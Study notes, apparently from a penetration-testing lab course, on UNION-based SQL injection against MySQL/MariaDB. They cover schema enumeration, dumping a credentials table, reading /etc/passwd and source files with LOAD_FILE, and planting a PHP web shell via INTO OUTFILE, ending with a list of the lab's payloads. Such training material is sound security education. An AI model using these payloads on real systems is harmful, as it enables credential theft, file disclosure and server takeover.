## Database Enumeration
### MySQL Fingerprinting
- Before database enumeration, identify the **DBMS type** (e.g., MySQL, MSSQL).
    
- Different DBMSs use **different SQL syntax**, so knowing the DBMS is crucial.
    
- **Web server clues** can suggest the DBMS type:
    
    - **Apache/Nginx** → likely **MySQL** (Linux systems).
        
    - **IIS** → likely **MSSQL** (Windows systems).
        
- These are just **educated guesses**, not guarantees.
    
- To confirm, use **fingerprinting queries** specific to the DBMS.
    
- In the context of this module, we focus on **fingerprinting MySQL** using known queries and observing their output.

| Payload            | When to Use                      | Expected Output                                     | Wrong Output                                              |
| ------------------ | -------------------------------- | --------------------------------------------------- | --------------------------------------------------------- |
| `SELECT @@version` | When we have full query output   | MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`'     | In MSSQL it returns MSSQL version. Error with other DBMS. |
| `SELECT POW(1,1)`  | When we only have numeric output | `1`                                                 | Error with other DBMS                                     |
| `SELECT SLEEP(5)`  | Blind/No Output                  | Delays page response for 5 seconds and returns `0`. | Will not delay response with other DBMS                   |
	
- As we saw in the example from the previous section, when we tried `@@version`, it gave us
	
![[Pasted image 20250523112943.png]]
	
- The output `10.3.22-MariaDB-1ubuntu1` means that we are dealing with a `MariaDB` DBMS similar to MySQL. Since we have direct query output, we will not have to test the other payloads.
### INFORMATION_SCHEMA Database
 - To pull data from tables using `UNION SELECT`, we need to properly form our `SELECT` queries. To do so, we need the following information:
	- List of databases
	- List of tables within each database
	- List of columns within each table
	
- This information allows us to build a proper `SELECT` statement to **dump data** from any column in any table.
    
- The **`INFORMATION_SCHEMA`** database contains **metadata** about all databases, tables, and columns on the server.
    
- This schema is critical for exploiting **SQL injection** vulnerabilities.
    
- Since `INFORMATION_SCHEMA` is a **separate database**, its tables cannot be queried directly with just a table name.
    
- To reference a table in another database, use the **dot operator (`.`)** in the format:  `database_name.table_name`
	
- For example, to `SELECT` a table `users` present in a database named `my_database`, we can use:
	 
```sql
SELECT * FROM my_database.users;
```
	
- Similarly, we can look at tables present in the `INFORMATION_SCHEMA` Database.
### SCHEMATA
- **Enumeration begins** by identifying the **available databases** on the DBMS.
    
- The **SCHEMATA** table in the **INFORMATION_SCHEMA** database holds this information.
    
- The column **SCHEMA_NAME** within **SCHEMATA**  contains **all database names** on the server.
    
- This information is essential to **query specific databases** later.
    
- A test can be performed on a local database to **observe how the query works**.
	
```mysql
mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

+--------------------+
| SCHEMA_NAME        |
+--------------------+
| mysql              |
| information_schema |
| performance_schema |
| ilfreight          |
| dev                |
+--------------------+
6 rows in set (0.01 sec)
```
	
- We see the `ilfreight` and `dev` databases.
	
>[!Note] The first three databases are default MySQL databases and are present on any server, so we usually ignore them during DB enumeration. Sometimes there's a fourth 'sys' DB as well.
	
- Now, let's do the same using a `UNION` SQL injection, with the following payload.
	
```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```
	 
![[Pasted image 20250523114818.png]]
	
- Two user-defined databases, `ilfreight` and `dev`, are identified alongside default databases.
    
- The next step is to determine **which database the web application is using** to retrieve `ports` data.
    
- This can be done by executing the SQL query: **SELECT database()**.
    
- This method is similar to the one used previously to **find the DBMS version**.
	
```sql
cn' UNION select 1,database(),2,3-- -
```
	
![[Pasted image 20250523114953.png]]
	 
- We see that the database name is `ilfreight`. However, the other database (`dev`) looks interesting. So, let us try to retrieve the tables from it.
### TABLES
- Before extracting data from the `dev` database, we need to **list all tables** in it.
    
- The `INFORMATION_SCHEMA.TABLES` table is used for this purpose.
    
- It stores metadata about **all tables** in all databases.
    
- Key columns of interest:
    
    - `TABLE_NAME`: Contains the **name of each table**.
        
    - `TABLE_SCHEMA`: Indicates the **database** each table belongs to.
        
- To list tables from the `dev` database, we can query `INFORMATION_SCHEMA.TABLES` using a payload that filters by `TABLE_SCHEMA = 'dev'`.
	
```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```
	
>[!Note] Note how we replaced the numbers '2' and '3' with 'TABLE_NAME' and 'TABLE_SCHEMA', to get the output of both columns in the same query.
	
![[Pasted image 20250523115404.png]]
	-
>[!Note] We added a (where table_schema='dev') condition to only return tables from the 'dev' database, otherwise we would get all tables in all databases, which can be many.
	
- We see four tables in the dev database, namely `credentials`, `framework`, `pages`, and `posts`.
### COLUMNS
- To **dump data from the `credentials` table**, we first need to **identify its column names**.
    
- The `INFORMATION_SCHEMA.COLUMNS` table contains metadata about **all columns** across all databases.
    
- Key columns of interest in this table:
    
    - `COLUMN_NAME`: Stores the **name of each column**.
        
    - `TABLE_NAME`: Indicates the **table** each column belongs to.
        
    - `TABLE_SCHEMA`: Specifies the **database** the table belongs to.
        
- To find column names in the `credentials` table, we use a **SELECT query** filtering `TABLE_NAME = 'credentials'` and the corresponding `TABLE_SCHEMA`.
	
```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```
	
![[Pasted image 20250523115639.png]]
	
- The table has two columns named `username` and `password`. We can use this information and dump data from the table.
### Data
- Now that we have all the information, we can form our `UNION` query to dump data of the `username` and `password` columns from the `credentials` table in the `dev` database. 
	
- We can place `username` and `password` in place of columns 2 and 3.
	
```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```
	
>[!Reminder] Don't forget to use the dot operator to refer to the 'credentials' in the 'dev' database, as we are running in the 'ilfreight' database, as previously discussed.
	
![[Pasted image 20250523120046.png]]
	 
- We were able to get all the entries in the `credentials` table, which contains sensitive information such as password hashes and an API key.
---
## Reading Files
- SQL Injection can also be leveraged to perform many other operations, such as reading and writing files on the server and even gaining remote code execution on the back-end server.
### Privileges
- **Reading data** is a more common operation than writing data in modern DBMSes.
    
- **Writing data is restricted** to privileged users due to potential security risks and system exploitation.
    
- In **MySQL**, the database user must have the `FILE` privilege to:
    
    - **Load file contents** into a table.
        
    - **Dump and read data** from that file via the table.
        
- Before attempting file operations, it's important to **check the database user’s privileges**.
    
- This helps determine whether **file reading and/or writing** is possible on the backend server.
### DB User
- First step: **Identify the current database user**.
    
- **DBA (Database Administrator) privileges** are increasingly required in modern DBMSes to read data.
    
- Having **DBA privileges increases the chances** of having **file-read permissions**.
    
- If the user **does not have DBA privileges**, further **privilege checks are necessary**.
    
- To find the **current DB user**, any of the following SQL queries can be used:
    
 ```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```
	
- These help assess the user's authority and potential access within the database.
	
- Our `UNION` injection payload will be as follows:
	
```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```
	
```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```
	 
- Which tells us our current user, which in this case is `root`:
	
![[Pasted image 20250523121620.png]]
	
- This is very promising, as a root user is likely to be a DBA, which gives us many privileges.
### User Privileges
- Now that we know our user, we can start looking for what privileges we have with that user.
	
- First of all, we can test if we have super admin privileges with the following query:
	
```sql
SELECT super_priv FROM mysql.user
```
	
- Once again, we can use the following payload with the above query.
	
```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```
	
- If we had many users within the DBMS, we can add `WHERE user="root"` to only show privileges for our current user `root`.
	
```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```
	
![[Pasted image 20250523122028.png]]
	
- The query returns `Y`, which means `YES`, indicating superuser privileges. We can also dump other privileges we have directly from the schema, with the following query.
	
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```
	
- From here, we can add `WHERE grantee="'root'@'localhost'"` to only show our current user `root` privileges. 
	
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```
	
- And we see all of the possible privileges given to our current user.
	
![[Pasted image 20250523122358.png]]
	
- We see that the `FILE` privilege is listed for our user, enabling us to read files and potentially even write files. Thus, we can proceed with attempting to read files.
### LOAD_FILE
- Once **sufficient privileges** are confirmed, **system files** can be read.
    
- In **MariaDB / MySQL**, the **`LOAD_FILE()`** function allows reading local files.
    
- The function requires **one argument only**: the **full file path**.
	
```sql
SELECT LOAD_FILE('/etc/passwd');
```
	
>[!Note]  We will only be able to read the file if the OS user running MySQL has enough privileges to read it.
	
- Similar to how we have been using a `UNION` injection, we can use the above query.
	
```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```
	
![[Pasted image 20250523122703.png]]
	
- We were able to successfully read the contents of the passwd file through the SQL injection.
### Another Example
- We know that the current page is `search.php`. The default Apache webroot  is `/var/www/html`.
	
- Let us try reading the source code of the file at `/var/www/html/search.php`.
	
```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```
	
![[Pasted image 20250523122951.png]]
	
- However, the page ends up rendering the HTML code within the browser. The HTML source can be viewed by hitting `[Ctrl + U]`.
	
![[Pasted image 20250523123108.png]]

---
## Writing Files
- **Writing files** to the backend server is **highly restricted** in modern DBMSes.
    
- It poses a serious threat as it can be used to **upload a web shell**, leading to **remote code execution** and **server takeover**.
    
- Therefore, **file writing is disabled by default** in most DBMSes.
    
- Only **database administrators (DBAs)** or users with **special privileges** can write files.
    
- Before attempting to write files, it's crucial to:
    
    - **Check user privileges**.
        
    - **Verify if the DBMS allows file writing**.
### Write File Privileges
- To be able to write files to the back-end server using a MySQL database, we require three things:
	
	1. User with `FILE` privilege enabled
	2. MySQL global `secure_file_priv` variable not enabled
	3. Write access to the location we want to write to on the back-end server
	
- We have already found that our current user has the `FILE` privilege necessary to write files. 
	
- We must now check if the MySQL database has that privilege. 
	
- This can be done by checking the `secure_file_priv` global variable.
### secure_file_priv
- The `secure_file_priv` variable in MySQL/MariaDB controls file read/write access paths.
    
- **Empty value** (`''`): Allows access to the **entire file system** (if FILE privilege is granted).
    
- **Directory path set**: Limits access to that **specific directory** only.
    
- **NULL value**: Completely **disables file read/write** operations.
    
- **MariaDB**: Default is **empty**, allowing unrestricted access if permitted.
    
- **MySQL**:
    
    - Default path is `/var/lib/mysql-files`, restricting access to this folder.
        
    - In **modern configurations**, it may be `NULL`, fully disabling file operations.
        
- To check the current value of `secure_file_priv` in MySQL, use:
	
```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```
	
- We are using **UNION-based SQL Injection** to extract data.
    
- MySQL configuration variables are stored in **`INFORMATION_SCHEMA.GLOBAL_VARIABLES`**.
    
- This table contains:
    
    - `variable_name` – the name of the configuration variable.
        
    - `variable_value` – the value assigned to it.
        
- Our goal is to retrieve the **`secure_file_priv`** variable to check file read/write permissions.
    
- We use a `SELECT` statement with a `WHERE` clause to filter only the `secure_file_priv` variable.
	
```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```
	
- So, similar to other `UNION` injection queries, we can get the above query result with the following payload. 
	
- Remember to add two more columns `1` & `4` as junk data to have a total of 4 columns'.
	
```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```
	
![[Pasted image 20250523125243.png]]
	
- And the result shows that the `secure_file_priv` value is empty, meaning that we can read/write files to any location.
### SELECT INTO OUTFILE
- We have **confirmed that our user has permission** to write files to the back-end server.
    
- The **`SELECT ... INTO OUTFILE`** statement is used to **write query results into a file**.
    
- This feature is commonly used for **exporting data** from database tables.
	
- To use it, we can add `INTO OUTFILE '...'` after our query to export the results into the file we specified.
	
```sql
-- Saves the output of the `users` table into the `/tmp/credentials` file.
SELECT * from users INTO OUTFILE '/tmp/credentials';
```
	
- If we go to the back-end server and `cat` the file, we see that table's content.
	
```shell-session
Whog@htb[/htb]$ cat /tmp/credentials 

1       admin   392037dbba51f692776d6cefb6dd546d
2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
```
	
- It is also possible to directly `SELECT` strings into files, allowing us to write arbitrary files to the back-end server.
	-
```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```
	
- When we `cat` the file, we see that text.
	
```shell-session
Whog@htb[/htb]$ cat /tmp/test.txt 
this is a test
```
	
```shell-session
Whog@htb[/htb]$ ls -la /tmp/test.txt 
-rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt # As we can see , the `test.txt` file was created successfully and is owned by the `mysql` user.
```
	
> [!Tip] Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.
### Writing Files through SQL Injection
- Let's try writing a text file to the webroot and verify if we have write permissions. 
	
- The below query should write `file written successfully!` to the `/var/www/html/proof.txt` file, which we can then access on the web application
	-
```sql
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
```
	
>[!Note] To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.
	
```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```
	
![[Pasted image 20250523130649.png]]
	
- We don’t see any errors on the page, which indicates that the query succeeded. Checking for the file `proof.txt` in the webroot, we see that it indeed exists:
	-
![[Pasted image 20250523130740.png]]
	-
>[! Note] We see the string we dumped along with '1' before it, and '3' and '4' after it. This is because the entire 'UNION' query result was written to the file. To make the output cleaner, we can use "" instead of numbers.
### Writing a Web Shell
- Having confirmed write permissions, we can go ahead and write a PHP web shell to the webroot folder. 
	
- We can write the following PHP webshell to be able to execute commands directly on the back-end server.
	
```php
<?php system($_REQUEST[0]); ?>
```
	
- We can reuse our previous `UNION` injection payload, and change the string to the above, and the file name to `shell.php`.
	
```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```
	
![[Pasted image 20250523131035.png]]
	
- Once again, we don't see any errors, which means the file write probably worked. 
	
- This can be verified by browsing to the `/shell.php` file and executing commands via the `0` parameter, with `?0=id` in our URL.
	
![[Pasted image 20250523151619.png]]
	
- The output of the `id` command confirms that we have code execution and are running as the `www-data` user.
---
---
## Commands used for the questions
```sql
94.237.59.174:40028

password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database

-> ' union select 1, 2, 3, 4 -- -
-> ' union select 1, schema_name, 3, 4  from information_schema.schemata -- -
-> ' union select 1, database(), 3, 4 -- -
-> ' union select 1, table_name, table_schema, 4  from information_schema.tables where table_schema='ilfreight' -- -
-> ' union select 1, column_name, table_name, table_schema from information_schema.columns where table_name='users' -- -
-> ' union select 1, username, password, 4 from ilfreight.users -- -
-> ' union select 1, user(), 3, 4 --
-> ' union select 1, super_priv, 3, 4 from mysql.user-- 
-> ' union select 1, grantee, privilege_type, 4 from information_schema.user_privileges where grantee="'root'@'localhost'"--
-> ' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
-> ' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
-> ' union select 1, variable_name, variable_value,4 from information_schema.global_variables where variable_name="secure_file_priv" -- 
-> ' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- 
```